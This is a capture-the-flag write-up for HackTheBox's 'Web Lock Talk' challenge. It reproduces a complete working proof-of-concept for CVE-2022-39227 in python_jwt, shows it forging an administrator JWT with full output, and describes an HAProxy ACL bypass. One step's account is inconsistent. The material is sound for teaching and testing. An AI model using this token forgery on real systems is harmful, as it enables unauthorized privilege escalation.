---
layout: post
title: "web locktalk"
date: 2024-03-14 17:18:49 -0700
categories: ctfs
description: The "Web Lock Talk" challenge involved reverse engineering an application accessible via a web interface. By examining configuration files, identifying endpoint restrictions, and exploiting a known CVE in a JWT library, participants aimed to bypass access controls and access the hidden flag endpoint.
parent: HackTheBox - Apocalypse '24
grand_parent: CTF Events
event: "hackthebox-apocalypse"
tags:
- "reverse engineering"
- "web security"
- "access controls"
- "JWT"
- "CVE"
- "exploitation"
---

## Web Lock Talk - Reverse Engineering
The "Web Lock Talk" challenge presented a web security puzzle requiring reverse engineering skills to bypass access controls and access a hidden flag endpoint. Despite being comparatively easier than other challenges, obtaining the source code was crucial for a proper solution.

### Analysis and Exploitation:
Upon reviewing the challenge files, including the Dockerfile and configuration files, we gained insight into the infrastructure and application requirements. Notably, examining the HAProxy configuration revealed endpoint restrictions and backend configurations. Additionally, identifying a specific CVE in the Python JWT library hinted at a potential avenue for exploitation.
### HAProxy ACL
```
http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
```
### Python Requirements
```
uwsgi
Flask
requests
python_jwt==3.3.3
```
### Our target
```python
@api_blueprint.route('/flag', methods=['GET'])
@authorize_roles(['administrator'])
def flag():
    return jsonify({'message': current_app.config.get('FLAG')}), 200
```
### CVE POC for python_jwt<=3.3.3
```python
#!/usr/bin/env python3
# Proof of concept for the CVE-2022-39227. According to this CVE, there is a flaw in the JSON Web Token verification. It is possible with a valid token to re-use its signature with moified claims. 
# 
# Application: python-jwt
# Infected version: < 3.3.4
# CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-39227
#
# Dependencies: jwcrypto, json, argparse
# Author: user0x1337
# Github: https://github.com/user0x1337
#
from json import loads, dumps
from jwcrypto.common import base64url_decode, base64url_encode
import argparse

parser = argparse.ArgumentParser(prog='CVE-2022-39227-PoC', description='Proof of Concept for the JWT verification bug in python-jwt version < 3.3.4')
parser.add_argument('-j', '--jwt_token', required=True, dest='token', help='Original and valid JWT Token returned by the application')
parser.add_argument('-i', '--injected_claim', required=True, dest='claim', help='Inject claim using the form "key=value", e.g. "username=admin". Use "," for more claims (e.g. username=admin,id=3)')
args = parser.parse_args()

# Split JWT in its ingredients
[header, payload, signature] = args.token.split(".")
print(f"[+] Retrieved base64 encoded payload: {payload}")

# Payload is relevant
parsed_payload = loads(base64url_decode(payload))
print(f"[+] Decoded payload: {parsed_payload}")

# Processing of the user input and inject new claims
try:
    claims = args.claim.split(",")
    for c in claims:
        key, value = c.split("=")
        parsed_payload[key.strip()] = value.strip()
except:
    print("[-] Given claims are not in a valid format")
    exit(1)

# merging. Generate a new payload
print(f'[+] Inject new "fake" payload: {parsed_payload}')
fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
print(f'[+] Fake payload encoded: {fake_payload}\n')

# Create a new JWT Web Token
new_payload = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
print(f'[+] New token:\n {new_payload}\n')
print(f'Example (HTTP-Cookie):\n------------------------------\nauth={new_payload}')
```
### Exploiting the CVE(s):
By leveraging the identified CVE, which allowed bypassing token signing, we devised a plan to manipulate our role from guest to administrator. After browsing to the site and encountering access restrictions, we employed URL encoding to circumvent the ACL blocking access to the "get ticket" endpoint. Subsequently, we generated a ticket and validated its functionality in the "chat" endpoint.
#### Bypassing ACL
The base page

![alt text](../../../assets/images/ctf/events/hackthebox-apocalypse-24/2024-03-14-web-locktalk.md/2024-03-14-web-locktalk/image.png)

The /api/v1/get_ticket endpoint

![alt text](../../../assets/images/ctf/events/hackthebox-apocalypse-24/2024-03-14-web-locktalk.md/2024-03-14-web-locktalk/image-1.png)

Burpsuite request with altered URI, couldn't use urlencoding as ACL explicitly transcoded it before passing it through to the app

![alt text](../../../assets/images/ctf/events/hackthebox-apocalypse-24/2024-03-14-web-locktalk.md/2024-03-14-web-locktalk/image-2.png)

Contents of the returned JWT through CyberChef

![alt text](../../../assets/images/ctf/events/hackthebox-apocalypse-24/2024-03-14-web-locktalk.md/2024-03-14-web-locktalk/image-3.png)


### Obtaining the Flag:
Despite accessing the chat endpoint, our primary goal was to reach the hidden "flag" endpoint restricted to administrators. Utilizing the CVE exploit, we crafted a new JWT token with an elevated role and injected it into the request header. This allowed us to browse to the "flag" endpoint successfully and obtain the desired results.

#### JWT CVE
```sh
python cve.py -j eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA2MjQ4MjMsImlhdCI6MTcxMDYyMTIyMywianRpIjoiRkpaWEF4LTVYREZrNkNQZmpVTkF0QSIsIm5iZiI6MTcxMDYyMTIyMywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.HDoQGwwpJJxzxDJg04TegMmVixxGkOkxFvQ--gdRafTv6XNpqZCCNpXksS-WqH_sogj5jUbOULv7bY8ZOFWRzYlKg0sH9kIkYuHBXA2g19htbwq0Vs2YNARGmL28NwVv9p6VmdsoavZsoqB2m3uQ2s-vTD6OzDpe887cwiRv8TidkuxcP4m6PUhrlbvPt4hHYJzhOtRx2GICs38yDj-n1bWOKqfY6mQ6PBURGRvcHugH31vCUwI2REtGqvfTgFbFyfVPLiVj47K_tBwlD-lm9qPd4HnROhsKEC0kJOHUjZCc7Zz0RezYFLNtNNn0ndL5Sbt5uuPnRlzX6MeQQ5l5GQ -i role="administrator"
[+] Retrieved base64 encoded payload: eyJleHAiOjE3MTA2MjQ4MjMsImlhdCI6MTcxMDYyMTIyMywianRpIjoiRkpaWEF4LTVYREZrNkNQZmpVTkF0QSIsIm5iZiI6MTcxMDYyMTIyMywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ
[+] Decoded payload: {'exp': 1710624823, 'iat': 1710621223, 'jti': 'FJZXAx-5XDFk6CPfjUNAtA', 'nbf': 1710621223, 'role': 'guest', 'user': 'guest_user'}
[+] Inject new "fake" payload: {'exp': 1710624823, 'iat': 1710621223, 'jti': 'FJZXAx-5XDFk6CPfjUNAtA', 'nbf': 1710621223, 'role': 'administrator', 'user': 'guest_user'}
[+] Fake payload encoded: eyJleHAiOjE3MTA2MjQ4MjMsImlhdCI6MTcxMDYyMTIyMywianRpIjoiRkpaWEF4LTVYREZrNkNQZmpVTkF0QSIsIm5iZiI6MTcxMDYyMTIyMywicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9

[+] New token:
 {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA2MjQ4MjMsImlhdCI6MTcxMDYyMTIyMywianRpIjoiRkpaWEF4LTVYREZrNkNQZmpVTkF0QSIsIm5iZiI6MTcxMDYyMTIyMywicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTA2MjQ4MjMsImlhdCI6MTcxMDYyMTIyMywianRpIjoiRkpaWEF4LTVYREZrNkNQZmpVTkF0QSIsIm5iZiI6MTcxMDYyMTIyMywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"HDoQGwwpJJxzxDJg04TegMmVixxGkOkxFvQ--gdRafTv6XNpqZCCNpXksS-WqH_sogj5jUbOULv7bY8ZOFWRzYlKg0sH9kIkYuHBXA2g19htbwq0Vs2YNARGmL28NwVv9p6VmdsoavZsoqB2m3uQ2s-vTD6OzDpe887cwiRv8TidkuxcP4m6PUhrlbvPt4hHYJzhOtRx2GICs38yDj-n1bWOKqfY6mQ6PBURGRvcHugH31vCUwI2REtGqvfTgFbFyfVPLiVj47K_tBwlD-lm9qPd4HnROhsKEC0kJOHUjZCc7Zz0RezYFLNtNNn0ndL5Sbt5uuPnRlzX6MeQQ5l5GQ"}

Example (HTTP-Cookie):
------------------------------
auth={"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA2MjQ4MjMsImlhdCI6MTcxMDYyMTIyMywianRpIjoiRkpaWEF4LTVYREZrNkNQZmpVTkF0QSIsIm5iZiI6MTcxMDYyMTIyMywicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTA2MjQ4MjMsImlhdCI6MTcxMDYyMTIyMywianRpIjoiRkpaWEF4LTVYREZrNkNQZmpVTkF0QSIsIm5iZiI6MTcxMDYyMTIyMywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"HDoQGwwpJJxzxDJg04TegMmVixxGkOkxFvQ--gdRafTv6XNpqZCCNpXksS-WqH_sogj5jUbOULv7bY8ZOFWRzYlKg0sH9kIkYuHBXA2g19htbwq0Vs2YNARGmL28NwVv9p6VmdsoavZsoqB2m3uQ2s-vTD6OzDpe887cwiRv8TidkuxcP4m6PUhrlbvPt4hHYJzhOtRx2GICs38yDj-n1bWOKqfY6mQ6PBURGRvcHugH31vCUwI2REtGqvfTgFbFyfVPLiVj47K_tBwlD-lm9qPd4HnROhsKEC0kJOHUjZCc7Zz0RezYFLNtNNn0ndL5Sbt5uuPnRlzX6MeQQ5l5GQ"}
```

Using the token in the request

![alt text](../../../assets/images/ctf/events/hackthebox-apocalypse-24/2024-03-14-web-locktalk.md/2024-03-14-web-locktalk/image-4.png)

### Conclusion:
The "Web Lock Talk" challenge exemplified the importance of thorough analysis and exploitation of known vulnerabilities in web applications. By strategically leveraging the identified CVE, we bypassed access controls and achieved the desired outcome. This experience highlights the significance of understanding application security mechanisms and exploiting vulnerabilities to solve complex web security challenges.

